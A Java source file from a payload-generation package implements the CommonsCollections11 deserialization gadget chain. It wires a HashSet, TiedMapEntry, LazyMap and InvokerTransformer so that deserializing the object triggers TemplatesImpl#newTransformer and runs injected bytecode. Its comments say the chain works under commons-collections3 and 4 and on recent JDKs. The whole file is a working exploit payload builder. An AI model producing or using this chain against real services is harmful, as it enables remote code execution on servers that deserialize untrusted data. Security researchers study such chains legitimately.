package com.Jasetol.payloads;

import com.Jasetol.utils.CreateTemplatesImpl;
import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.HashSet;
/*
 * Gadget:
 *   HashSet#readObject
 *     HashMap#put
 *       TiedMapEntry#hashCode
 *         TiedMapEntry#getValue
 *           LazyMap#get
 *             InvokerTransformer#transform
 *               TemplatesImpl#newTransformer
 * 1. 可以在 commons-collections3/commons-collections4 的依赖下使用
 *      在 commons-collections4 依赖下的使用只需要换一种方法创建 LazyMap 对象即可
 *        LazyMap lazyMap = LazyMap.lazyMap(new HashMap(), invokerTransformer);
 * 2. 可以在高版本JDK中使用
 * */
public class CommonsCollections11 {

    public static Object getObject() throws Exception{
        TemplatesImpl templatesImpl = CreateTemplatesImpl.createTemplatesImpl();
        HashSet hashSet = new HashSet();
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TiedMapEntry tiedMapEntry = new TiedMapEntry(null,null);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),invokerTransformer);
        Reflect.reflectSetField(tiedMapEntry,"map",lazyMap);
        hashSet.add(tiedMapEntry);
        Reflect.reflectSetField(tiedMapEntry,"key",templatesImpl);
        return hashSet;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        HashSet hashSet = (HashSet) getObject();
        byte[] bytes = SerWithUnSer.serialize(hashSet);
        SerWithUnSer.unSerialize(bytes);
    }
}
